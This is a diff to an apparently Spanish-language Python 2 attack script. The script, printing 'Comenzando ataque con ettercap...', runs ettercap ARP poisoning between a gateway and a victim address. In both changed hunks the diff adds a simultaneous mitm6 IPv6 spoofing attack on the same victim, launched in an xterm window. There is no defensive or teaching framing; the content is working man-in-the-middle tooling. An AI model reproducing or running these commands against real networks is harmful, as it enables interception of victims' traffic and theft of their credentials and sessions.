@@ -57,7 +57,7 @@ if desea == "s" or desea == "S":
 	os.system("clear")
 	attack_ban()
 	print(G+"[SEND] "+W+"Comenzando ataque con ettercap..."+G)
-	os.system("sudo ettercap -T -S -i wlp1s0 -M arp:remote /"+gateway+"// /"+vic+"//")
+	os.system("sudo ettercap -T -S -i wlp1s0 -M arp:remote /"+gateway+"// /"+vic+"// & xterm -geometry 108x28 -e 'mitm6 -b "+vic+"'")
 	enter=raw_input(B+"ENTER PARA TERMINAR PROGRAMA")
 if desea == "n" or desea == "N":
 	print(W)
@@ -68,6 +68,6 @@ if desea == "n" or desea == "N":
 	os.system("clear")
 	attack_ban()
 	print(G+"[SEND] "+W+"Comenzando ataque con ettercap..."+G)
-	os.system("sudo ettercap -T -S -i wlp1s0 -M arp:remote /"+gateway+"// /"+vic+"//")
+	os.system("sudo ettercap -T -S -i wlp1s0 -M arp:remote /"+gateway+"// /"+vic+"// & xterm -geometry 108x28 -e 'mitm6 -b "+vic+"'")
 	enter=raw_input(B+"ENTER PARA TERMINAR PROGRAMA")
 
